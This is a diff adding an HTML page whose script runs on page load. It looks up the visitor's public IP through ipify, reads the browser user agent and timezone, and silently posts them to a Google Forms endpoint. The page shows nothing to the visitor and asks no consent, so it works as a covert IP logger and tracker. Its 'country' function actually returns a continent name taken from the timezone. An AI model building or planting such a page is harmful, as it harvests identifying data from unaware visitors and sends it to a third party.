@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Geolocation and User Agent Info</title>
+</head>
+<body>
+  <script>
+   // Function to retrieve user agent information
+function getUserAgent() {
+  return navigator.userAgent;
+}
+
+// Function to retrieve IP address
+function getIPAddress(callback) {
+  var xhr = new XMLHttpRequest();
+  xhr.open('GET', 'https://api.ipify.org?format=json', true);
+  xhr.onreadystatechange = function() {
+    if (xhr.readyState === 4 && xhr.status === 200) {
+      var response = JSON.parse(xhr.responseText);
+      var ipAddress = response.ip;
+      callback(ipAddress);
+    }
+  };
+  xhr.send();
+}
+
+// Function to retrieve timezone
+function getTimezone() {
+  return Intl.DateTimeFormat().resolvedOptions().timeZone;
+}
+
+// Function to retrieve country
+function getCountry() {
+  return Intl.DateTimeFormat().resolvedOptions().timeZone.split('/')[0];
+}
+
+// Function to submit data to Google Forms
+function submitData(userAgent, ipAddress, timezone, country) {
+  var formData = new FormData();
+  formData.append('entry.1064469062', userAgent);
+  formData.append('entry.2095676594', ipAddress);
+  formData.append('entry.1284802502', timezone);
+  formData.append('entry.1012469895', country);
+
+  var xhr = new XMLHttpRequest();
+  xhr.open('POST', 'https://docs.google.com/forms/d/e/1FAIpQLSckfmfyrG2fSGE97iaAx9CW9pUdoST-tDaWEnDQL1xUG43HBQ/formResponse', true);
+  xhr.onreadystatechange = function() {
+    if (xhr.readyState === 4 && xhr.status === 200) {
+      console.log('Data submitted successfully');
+    }
+  };
+  xhr.send(formData);
+}
+
+// Usage
+getIPAddress(function(ipAddress) {
+  var userAgent = getUserAgent();
+  var timezone = getTimezone();
+  var country = getCountry();
+
+  submitData(userAgent, ipAddress, timezone, country);
+});
+
+  </script>
+</body>
+</html>
